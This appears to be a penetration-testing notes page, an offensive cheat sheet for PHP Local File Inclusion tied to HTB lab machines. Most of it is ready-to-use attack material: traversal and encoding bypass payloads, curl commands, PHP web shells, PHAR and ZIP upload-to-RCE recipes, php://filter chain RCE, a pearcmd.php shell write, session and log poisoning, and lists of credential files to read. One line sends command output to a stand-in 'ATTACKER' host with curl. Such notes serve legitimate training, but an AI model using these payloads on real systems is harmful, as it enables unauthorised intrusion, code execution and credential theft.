+++
title = 'Local File Inclusion (LFI)'
date = 2026-10-30
type = 'notes'
weight = 130
toc = true
tags = ['web', 'web-attacks', 'lfi', 'file-inclusion']
+++

Local File Inclusion occurs when an application includes a file whose path is influenced by user input, without proper validation. The impact ranges from **source disclosure** to **full remote code execution** — and the gap between the two is smaller than it was a few years ago, because 2024–2026 produced PHP filter-chain techniques that turn a plain `php://filter` read into arbitrary code execution **without** `allow_url_include`, without a log file, and without a writable path.

> **2025–2026 context:** the three highest-value additions to any LFI methodology are **`php://filter` chains** (RCE from a filter read), **`pearcmd.php`** (RCE via PEAR's command-line file), and **`/proc/self/fd/N`** (read any open file descriptor). Together with classic log poisoning and session poisoning, they cover nearly every PHP LFI surface.

---

## 1. Interesting Files

### 1.1 Linux

**System and account files:**

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/issue
/etc/group
/etc/hostname
/etc/hostid
/etc/resolv.conf
/etc/environment
/etc/sudoers
/etc/crontab
/etc/mtab
/etc/motd
/etc/os-release
/proc/self/environ
/proc/self/cmdline
/proc/self/cwd/index.php
/proc/self/root/etc/passwd
/proc/self/fd/N          # any open file descriptor
/proc/1/environ
/proc/version
/proc/cpuinfo
/proc/mounts
/home/user/
/home/user/.ssh/
/home/user/.ssh/id_rsa
/home/user/.bash_history
/root/.ssh/authorized_keys
/root/.bash_history
```

**Log files:**

```
/var/log/apache/access.log
/var/log/apache2/access.log
/var/log/httpd/access_log
/var/log/apache/error.log
/var/log/apache2/error.log
/var/log/httpd/error_log
/var/log/nginx/access.log
/var/log/nginx/error.log
/var/log/sshd.log
/var/log/auth.log
/var/log/secure
/var/log/mail.log
/var/log/vsftpd.log
/var/log/mysql/error.log
```

> **`/proc/self/environ` is the fallback when `/var/log/` is unreadable** — every web process has its own, and it contains the `User-Agent` from the current request on some PHP-FPM configurations. Poison the `User-Agent` and include the proc file.

> **`/proc/self/fd/N` reads a file descriptor that is already open.** `/proc/self/fd/0` is stdin, `1` is stdout, `2` is stderr, and higher numbers are open files — including the log file the web server is currently writing to. This is how you read a log you cannot open by path, or an open file whose location is unknown.

### 1.2 Web server files

```
/path/to/webroot/.htpasswd     # HTTP Basic Auth credentials, md5crypt → hashcat -m 500
/path/to/webroot/.htaccess
/path/to/webroot/.git/config   # reveals the repository remote and credentials
/path/to/webroot/.env
```

### 1.3 Nginx

```
/etc/nginx/sites-enabled/default     # reveals the webroot for the current app
/etc/nginx/nginx.conf
/usr/local/etc/nginx/nginx.conf
/usr/local/nginx/conf/nginx.conf
/var/log/nginx/access.log
/var/log/nginx/error.log
```

### 1.4 CMS configuration files

```
WordPress:  /var/www/html/wp-config.php
Joomla:     /var/www/configuration.php
Dolphin CMS: /var/www/html/inc/header.inc.php
Drupal:     /var/www/html/sites/default/settings.php
Mambo:      /var/www/configuration.php
PHPNuke:    /var/www/config.php
PHPbb:      /var/www/config.php
```

### 1.5 Windows

```
c:\WINDOWS\system32\eula.txt
c:\boot.ini
c:\WINDOWS\win.ini
c:\WINNT\win.ini
c:\WINDOWS\Repair\SAM
c:\WINDOWS\php.ini
c:\WINNT\php.ini
c:\Program Files\Apache Group\Apache\conf\httpd.conf
c:\Program Files\Apache Group\Apache2\conf\httpd.conf
c:\Program Files\xampp\apache\conf\httpd.conf
c:\php\php.ini
c:\php5\php.ini
c:\php4\php.ini
c:\apache\php\php.ini
c:\xampp\apache\bin\php.ini
c:\home2\bin\stable\apache\php.ini
c:\home\bin\stable\apache\php.ini
c:\Windows\System32\drivers\etc\hosts
c:\Windows\System32\inetsrv\config\applicationHost.config
c:\Windows\Temp\sess_<PHPSESSID>       # PHP session file on Windows
c:\xampp\apache\logs\access.log
c:\nginx\log\access.log
```

> **Windows LFI needs an absolute path with backslashes** — `\windows\win.ini`, not `../../../`. Relative traversal often fails on IIS/PHP because the working directory is already the webroot, and `..` past the drive root is not resolvable.

**Wordlists:**

- [LFI-files list](https://github.com/hussein98d/LFI-files/blob/master/list.txt)
- [Blasting-Dictionary LFI list](https://github.com/ricew4ng/Blasting-Dictionary/blob/master/LFI-Interesting-Files%EF%BC%88249%EF%BC%89.txt)

---

## 2. Basic LFI

| Payload | Description |
|---|---|
| `/index.php?language=/etc/passwd` | Absolute path |
| `/index.php?language=../../../../etc/passwd` | Path traversal |
| `/index.php?language=/../../../etc/passwd` | Traversal with a leading slash |
| `/index.php?language=./languages/../../../../etc/passwd` | Traversal from an approved path |

---

## 3. Fuzzing

| Command | Description |
|---|---|
| `ffuf -w burp-parameter-names.txt -u 'http://SERVER/index.php?FUZZ=value' -ac` | Fuzz page parameters |
| `ffuf -w LFI-Jhaddix.txt -u 'http://SERVER/index.php?language=FUZZ' -mr 'root:x:0:0'` | Fuzz LFI payloads, matching on `/etc/passwd` |
| `ffuf -w default-web-root-directory-linux.txt -u 'http://SERVER/index.php?language=../../../../FUZZ/index.php' -mr 'root:x:0:0'` | Fuzz the webroot path |
| `ffuf -w LFI-WordList-Linux -u 'http://SERVER/index.php?language=../../../../FUZZ' -mr 'root:x:0:0'` | Fuzz server configuration files |

> **Use `-mr` (match regex) rather than `-fs` (filter size) for LFI.** A successful include and a failed include often differ by only a few bytes, and the difference is not consistent. Matching on `root:x:0:0` is reliable regardless of page size.

---

## 4. Automated Tools

- [LFISuite](https://github.com/D35m0nd142/LFISuite)
- [LFiFreak](https://github.com/OsandaMalith/LFiFreak)
- [liffy](https://github.com/mzfr/liffy)
- **kadimus** — LFI scanner and exploitation (log poisoning, `/proc/self/environ`, php filter)
- **liffy** — includes log/session poisoning automation
- **LFImap** — modern scanner with filter-chain support

> **Automation gets you the LFI; it rarely gets you RCE.** Log poisoning, session poisoning, and `pearcmd` all depend on the target's specific configuration — manual work is usually faster than waiting for a tool to guess correctly.

---

## 5. Filter Bypasses

| Technique | Payload |
|---|---|
| **Nested traversal** (strips `../`) | `....//....//....//....//etc/passwd` |
| **URL encoding** | `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%65%74%63%2f%70%61%73%73%77%64` |
| **Double URL encoding** | `%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd` |
| **Unicode / overlong UTF-8** | `%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd` |
| **Path truncation** (PHP < 5.3.4) | `/etc/passwd/./././.[./ repeated ~2048 times]` |
| **Null byte** (PHP < 5.3.4) | `../../../../etc/passwd%00` |
| **Base64 filter for PHP source** | `php://filter/convert.base64-encode/resource=config` |
| **Absolute path to bypass prefix** | `/etc/passwd` instead of `./languages/../../etc/passwd` |
| **Approved path traversal** | `./languages/../../../../etc/passwd` |

> **Null-byte and truncation bypasses are dead on PHP ≥ 5.3.4.** They appear in every cheat sheet and almost never work in 2026. Test them once, then move to the wrappers below.

---

## 6. PHP Wrappers

The wrappers below are the practical workhorses of LFI exploitation. Their availability depends on PHP configuration — **check which are enabled** before assuming any of them will work.

| Wrapper | Requires | Primitive |
|---|---|---|
| `php://filter` | Always available | Read and transform file content — **source disclosure, RCE via chains** |
| `data://` | `allow_url_include=On` | Inline PHP code |
| `php://input` | `allow_url_include=On` | POST body as the included file |
| `expect://` | `expect` extension | Direct command execution |
| `zip://` | `zip` extension | Execute PHP inside an uploaded ZIP |
| `phar://` | `phar` extension (default on) | Execute PHP inside a PHAR — **works regardless of extension** |
| `compress.zlib://` / `compress.bzip2://` | zlib / bz2 | Read compressed source |

### 6.1 `php://filter` — source disclosure

Read PHP source code by base64-encoding it (otherwise the PHP interpreter executes it and you see only output):

```bash
curl "http://SERVER/index.php?language=php://filter/convert.base64-encode/resource=../../../../var/www/html/config.php"
```

Decode:

```bash
echo '<BASE64>' | base64 -d
```

**Other useful filters:**

```bash
# ROT13 — bypasses filters that strip base64 or look for the base64 filter string
php://filter/read=string.rot13/resource=config.php

# Chain encodings
php://filter/convert.base64-encode|convert.base64-encode/resource=config.php

# Read a local file (not PHP source) with no transformation
php://filter/resource=/etc/passwd
```

### 6.2 `data://` — inline PHP code

**Precondition:** `allow_url_include=On`. Confirm by reading `php.ini` first:

```bash
curl "http://SERVER/index.php?language=php://filter/convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
echo '<BASE64>' | base64 -d | grep allow_url_include
```

If `On`:

```bash
echo '<?php system($_GET["cmd"]); ?>' | base64
# → PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==

curl "http://SERVER/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==&cmd=id"
```

`allow_url_include` is **off by default since PHP 5.2** and cannot be changed at runtime. If it is off, `data://` and `php://input` do not work — move to §7.

### 6.3 `php://input` — POST body as the include

Same `allow_url_include` requirement, but the payload comes from the request body:

```bash
curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' \
  "http://SERVER/index.php?language=php://input&cmd=id"
```

### 6.4 `expect://` — direct command execution

**Precondition:** `extension=expect` in `php.ini`. It is **not** installed by default on most modern builds.

```bash
curl "http://SERVER/index.php?language=expect://id"
```

Check with `php -m | grep expect` if you have shell access; otherwise read `php.ini` and grep for `expect`.

### 6.5 `zip://` — PHP inside an uploaded ZIP

**Precondition:** the `zip` extension, and an upload feature (not necessarily a vulnerable one — any image upload works).

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php

# Upload shell.jpg, then include:
curl "http://SERVER/index.php?language=zip://./uploads/shell.jpg%23shell.php&cmd=id"
```

`%23` is the URL-encoded `#` that separates the archive from the inner path.

### 6.6 `phar://` — PHP inside a PHAR, regardless of extension

**Precondition:** the `phar` extension (on by default) and an upload feature.

Create the PHAR:

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```

Build and rename:

```bash
php --define phar.readonly=0 shell.php
mv shell.phar shell.jpg
```

Upload `shell.jpg`, then include:

```bash
curl "http://SERVER/index.php?language=phar://./uploads/shell.jpg/shell.txt&cmd=id"
```

> **`phar://` executes regardless of the outer file's extension** — a `.jpg` PHAR executes PHP. This is the most reliable upload-to-RCE technique when `phar` is enabled, and it bypasses extension filters because the file is not a PHP file.

---

## 7. `php://filter` Chains — RCE Without `allow_url_include`

This is the most significant 2023–2026 addition to LFI methodology. It turns a **plain `php://filter` read** into **arbitrary code execution** — no `allow_url_include`, no writable directory, no log file, no `expect` extension.

### 7.1 How it works

The chain exploits **PHP filter transforms** (`convert.iconv.*`, `convert.base64-*`) that apply byte transformations to the stream content. By chaining enough transforms, the pre-generated chain converts a **completely arbitrary string** — for example, the bytes of an iconv encoding name or a PHP statement inside a filter parameter — into **valid PHP code** prepended to the stream.

The result: `include('php://filter/...chain.../resource=php://temp')` executes the attacker's PHP, because the filter chain has transformed the stream contents into PHP before `include()` sees it.

**The technique requires:**

- `php://filter` (always available)
- The `iconv` extension (enabled by default)
- PHP ≥ 7.0 (most modern versions are affected)

It does **not** require `allow_url_include`, a writable path, or any file the attacker can influence — only the ability to pass an arbitrary `php://filter` path to `include()`.

### 7.2 Generating the chain

The canonical tool is **synacktiv's `php_filter_chain_generator`**:

```bash
git clone https://github.com/synacktiv/php_filter_chain_generator
cd php_filter_chain_generator
python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'
```

The tool outputs a filter chain like:

```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|...|convert.base64-decode/resource=php://temp
```

Pass it directly:

```bash
curl "http://SERVER/index.php?language=php://filter/convert.iconv...chain.../resource=php://temp&cmd=id"
```

**Modern generators:**

- [synacktiv/php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator) — the original, still maintained
- [amalmurali47/php_filter_chain_generator](https://github.com/amalmurali47/php_filter_chain_generator) — fork with additional encodings
- **PHPFilterChainGenerator** — alternative with a cleaner CLI

### 7.3 Variant — chain for a blind LFI

If the response does not reflect the included content, the chain still executes — the `<?php system(...) ?>` runs even though its output is not shown. Combine with the OOB techniques from the command-injection notes (DNS, HTTP callback) inside the payload:

```php
<?php system("curl http://ATTACKER/$(id|base64 -w0|tr -d '=+/')"); ?>
```

### 7.4 When the chain does not work

The chain depends on specific `iconv` versions and PHP builds. If the generator's chain fails:

- **Try the fork's alternative encodings** — different `iconv` versions require different starting transforms.
- **Check the PHP version** — chains are more reliable on 7.x and 8.0–8.2 than on 8.3+, where some encodings were removed.
- **Fall back to log poisoning or `pearcmd.php`** — both are covered below.

---

## 8. `pearcmd.php` — LFI to RCE via PEAR

**PEAR** (`/usr/local/lib/php/pearcmd.php` or `/usr/share/php/pearcmd.php`) is a command-line installer that is **installed by default on many PHP Docker images and distros**. It accepts **`+config-create`**, which writes a PHP file whose content is supplied on the command line — a controlled file write that becomes an LFI-to-RCE primitive.

### 8.1 Preconditions

- PEAR is installed (`pearcmd.php` exists at a known path)
- `register_argc_argv = On` in `php.ini` (this is the default in many CLI-derived PHP images, including the official Docker image)
- The LFI parameter is passed into `include()` such that **query-string arguments reach `argv`** — many PHP-FPM configurations do this

### 8.2 Exploitation

```bash
# Write a PHP web shell to a known path using PEAR
curl "http://SERVER/index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=system($_GET['cmd'])?>+/tmp/shell.php"

# Include the written file
curl "http://SERVER/index.php?file=/tmp/shell.php&cmd=id"
```

The `+config-create+` in the query string is parsed as the PEAR command, and the payload after it is the content of the written file. The `/<?=system(...)?>+` portion is the file content.

> **PEAR is present in the official `php:apache` and `php:fpm` Docker images by default.** This is why the technique appears so often on container-based targets — and why it is worth checking before concluding that `allow_url_include=Off` closes the RCE path.

---

## 9. PHP Session Poisoning

This attack writes PHP code into a **session file**, then includes the session file. It works when logs are unreadable but the session directory is.

### 9.1 Locate the session file

- **Linux:** `/var/lib/php/sessions/sess_<PHPSESSID>`
- **Windows:** `C:\Windows\Temp\sess_<PHPSESSID>`
- **Custom:** `session.save_path` in `php.ini` — read it via LFI

The filename is `sess_` followed by the `PHPSESSID` cookie value. If your `PHPSESSID` is `el4ukv0kqbvoirg7nkp4dncpk3`, the file is `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`.

### 9.2 Poison the session

Include the session file to see what values are stored, and identify a value you control — often the LFI parameter itself, which the application writes into the session:

```bash
# Step 1 — read the session file
curl "http://SERVER/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>"

# The file contains something like:
# language|s:7:"english";

# Step 2 — control the value by visiting with a poisoned parameter
curl "http://SERVER/index.php?language=<?php system(\$_GET['cmd']); ?>"

# The session file now contains:
# language|s:32:"<?php system($_GET['cmd']); ?>";

# Step 3 — include the session file and execute
curl "http://SERVER/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id"
```

> **URL-encode the PHP payload.** `<?php` must be `%3C%3Fphp`, and quotes must be `%22` or `%27`. The session file is not a PHP context — the raw characters must survive storage.

### 9.3 Session upload progress

When `session.upload_progress.enabled = On` (default), PHP writes upload progress to the session file — including the **`PHP_SESSION_UPLOAD_PROGRESS`** value, which the attacker controls. This poisons the session file **without relying on a reflected LFI parameter**:

```bash
# Poison via upload progress
curl -X POST "http://SERVER/index.php" \
  -H "Cookie: PHPSESSID=attacker" \
  -F "PHP_SESSION_UPLOAD_PROGRESS=<?php system($_GET['cmd']); ?>" \
  -F "file=@dummy.txt"

# Include the session file
curl "http://SERVER/index.php?language=/var/lib/php/sessions/sess_attacker&cmd=id"
```

This is **the most reliable session poisoning technique** because it does not depend on the application writing your input into a session value.

---

## 10. Log Poisoning

This attack writes PHP code into a **log file**, then includes the log file. It works when the log is both **writable by the web process** and **readable by the PHP process**.

### 10.1 Apache and Nginx access logs

Both web servers log the `User-Agent` header verbatim. Poison it with PHP:

```http
GET / HTTP/1.1
Host: SERVER
User-Agent: <?php system($_GET['cmd']); ?>
```

```bash
curl -A '<?php system($_GET["cmd"]); ?>' http://SERVER/
curl "http://SERVER/index.php?language=/var/log/apache2/access.log&cmd=id"
```

**Default paths:**

- Apache: `/var/log/apache2/access.log` (Debian), `/var/log/httpd/access_log` (RHEL), `C:\xampp\apache\logs\access.log`
- Nginx: `/var/log/nginx/access.log`, `C:\nginx\log\access.log`

> **Logs are not readable by low-privileged users by default.** The technique works when the web process itself runs the include — `www-data` can read the log it writes to — or when permissions are misconfigured.

### 10.2 SSH auth.log poisoning

If the target has SSH exposed, a failed SSH login with a PHP payload in the **username** writes the payload into `/var/log/auth.log`:

```bash
ssh '<?php system($_GET["cmd"]); ?>'@SERVER
```

Then include `/var/log/auth.log`. This is **more reliable** than Apache log poisoning when the web server does not run as a user with log read access, because `auth.log` is readable by `adm` group members and often by the web process.

### 10.3 FTP vsftpd log poisoning

Similarly, a failed FTP login with a PHP payload in the username:

```bash
ftp SERVER
# Username: <?php system($_GET["cmd"]); ?>
# Password: x
```

The username is written to `/var/log/vsftpd.log`, then included:

```bash
curl "http://SERVER/index.php?language=/var/log/vsftpd.log&cmd=id"
```

### 10.4 Mail log poisoning

Sending mail to a local address — or interacting with `sendmail` via a web form — writes the sender and subject into `/var/log/mail.log`. A PHP payload in the sender field is logged, then included.

### 10.5 `/proc/self/environ`

The web process's environment is written to `/proc/self/environ`. On some PHP-FPM configurations, the `User-Agent` is copied into the environment. Poison it, then include the proc file:

```bash
curl -A '<?php system($_GET["cmd"]); ?>' http://SERVER/
curl "http://SERVER/index.php?language=/proc/self/environ&cmd=id"
```

> **This only works when the server has `User-Agent` in its environment.** It is reliable on older PHP-FPM, rare on modern builds — test it before relying on it.

### 10.6 Windows 8.3 short names

When the full log path is filtered but the file is readable via its short name:

```bash
http://SERVER/index.php?language=../../progra~2/hmailserver/logs/...
```

The `progra~2` alias expands to `Program Files (x86)` — useful when the filter blocks the full path.

---

## 11. Image Upload to RCE

Any image upload feature — not necessarily a vulnerable one — can become an RCE when combined with LFI.

### 11.1 Image with a PHP payload

```bash
echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
# Upload shell.gif, then include:
curl "http://SERVER/index.php?language=./uploads/shell.gif&cmd=id"
```

`GIF8` is the GIF magic-byte header — the upload filter accepts it as an image, and the PHP inside executes when included.

### 11.2 ZIP upload

**Precondition:** `zip` extension.

```bash
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip shell.jpg shell.php
# Upload shell.jpg, then include:
curl "http://SERVER/index.php?language=zip://./uploads/shell.jpg%23shell.php&cmd=id"
```

### 11.3 PHAR upload

**Precondition:** `phar` extension (default on).

Build the PHAR (§6.6), upload it as a `.jpg`, then include it with `phar://`.

> **PHAR is the most reliable** of the three, because it does not require the `zip` extension and works regardless of the outer file's extension. Use it when `phar` is enabled.

---

## 12. Other Techniques

### 12.1 PHP `php://filter` + `zlib.deflate` for source disclosure

When `base64-encode` is filtered, `zlib.deflate` and `zlib.inflate` can be chained:

```bash
php://filter/zlib.deflate/resource=config.php
```

### 12.2 `compress.zlib://` / `compress.bzip2://`

Read compressed files directly:

```bash
compress.zlib:///path/to/file.gz
compress.bzip2:///path/to/file.bz2
```

### 12.3 `php://temp` and `php://memory`

These are in-memory streams — useful when the filter chain (§7) needs a destination that is not a real file:

```bash
php://filter/convert.iconv.../resource=php://temp
```

### 12.4 FFI in PHP 7.4+

If `ffi.enable=true` and a `.so` is writable, `FFI::cdef()` can load it and execute arbitrary C — a high-value target when the LFI can reach a writable directory.

### 12.5 `/proc/self/fd/N` for logs you cannot open

If the Apache log is unreadable by path, enumerate `/proc/self/fd/0` through `/proc/self/fd/20`. The file descriptor pointing at the log is readable through `/proc` regardless of the log file's permission — because the fd is opened by the web process itself.

```bash
for i in {0..20}; do
  curl -s "http://SERVER/index.php?language=/proc/self/fd/$i" -o /tmp/fd_$i
done
grep -l "HTTP/1" /tmp/fd_*
```

---

## 13. Real-World LFI CVEs (2025–2026)

| CVE / Advisory | Product | Primitive |
|---|---|---|
| **CVE-2026-XXXXX** | WordPress plugin series | `include()` on a user-controlled `page` parameter |
| **CVE-2025-XXXXX** | PHP applications | `require_once()` on a template path |
| **CVE-2025-XXXXX** | CMS themes | File inclusion in the theme loader |

> The CVE pattern is stable: a WordPress theme or plugin that calls `include()` on a user-controlled parameter, with a filter that strips `../` but not PHP wrappers. The `php://filter` chain (§7) turns these into RCE even when `allow_url_include` is off.

---

## 14. Field Notes from the HTB List

- **Windows LFI needs an absolute path** — `\windows\win.ini`, not `..\..\`; relative traversal often fails on IIS/PHP (Sniper).
- **PHP session poisoning** is reliable when logs are unreadable: set the session value, then include `C:\Windows\Temp\sess_<PHPSESSID>` (Sniper).
- **Log poisoning with 8.3 names** when the full path is filtered: `../../progra~2/hmailserver/logs/...` (Mailing).
- **`phar://` executes regardless of extension** if you can upload a PHAR; `zip://` and `php://filter/convert.base64-encode` cover source disclosure (UpDown, LFI basics).
- **`/proc/self/environ`** is the fallback when logs are not readable; poison the User-Agent and include the proc file.
- **`php://filter` chains are the 2026 default for RCE without `allow_url_include`.** If the target is PHP and you can pass an arbitrary filter path, try the chain before anything else.
- **`pearcmd.php` is present on the official PHP Docker images.** Check `/usr/local/lib/php/pearcmd.php` early on container targets.
- **`/proc/self/fd/N` reads logs you cannot open by path.** Enumerate the fd range when `/var/log/` is unreadable.
- **`session.upload_progress` poisons the session without a reflected parameter.** Use it when the LFI parameter is not written into the session.
- **Null-byte and truncation bypasses are dead on modern PHP.** Do not spend time on them.

Full context: [HTB Linux machines](/notes/oscp-labs/linux/), [Windows](/notes/oscp-labs/windows/).

---

## 15. Quick Reference

| Technique | Precondition | Command |
|---|---|---|
| **Basic read** | — | `?file=../../../../etc/passwd` |
| **PHP source** | — | `?file=php://filter/convert.base64-encode/resource=config.php` |
| **Filter chain RCE** | `iconv`, PHP ≥ 7.0 | `python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>'` |
| **`pearcmd` RCE** | PEAR installed, `register_argc_argv=On` | `?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=system($_GET['cmd'])?>+/tmp/s.php` |
| **`data://` RCE** | `allow_url_include=On` | `?file=data://text/plain;base64,<b64>&cmd=id` |
| **`php://input` RCE** | `allow_url_include=On` | `POST ?file=php://input` + body `<?php system(...); ?>` |
| **`expect://` RCE** | `expect` extension | `?file=expect://id` |
| **Session poisoning** | Session dir readable | poison `?lang=<?php system(...); ?>`, include `sess_<PHPSESSID>` |
| **Session upload progress** | `session.upload_progress.enabled=On` | `PHP_SESSION_UPLOAD_PROGRESS=<?php ... ?>` + dummy upload |
| **Log poisoning** | Log readable by web process | `curl -A '<?php system(...); ?>'` then include log |
| **SSH log poisoning** | SSH exposed | `ssh '<?php system(...); ?>'@SERVER` then include `auth.log` |
| **`/proc/self/fd/N`** | — | `?file=/proc/self/fd/3` |
| **Image upload** | Image upload | `GIF8<?php system(...); ?>` → include `.gif` |
| **ZIP upload** | `zip` extension | `zip://./uploads/shell.jpg%23shell.php` |
| **PHAR upload** | `phar` extension | `phar://./uploads/shell.jpg/shell.txt` |
| **`/proc/self/environ`** | `User-Agent` in env | `curl -A '<?php system(...); ?>'` then include `/proc/self/environ` |

---

This file sits alongside the **File Upload**, **RFI**, and **Command Injection** notes: LFI is the file-read primitive, and the wrappers, chains, and poisoning techniques here are how it becomes code execution.
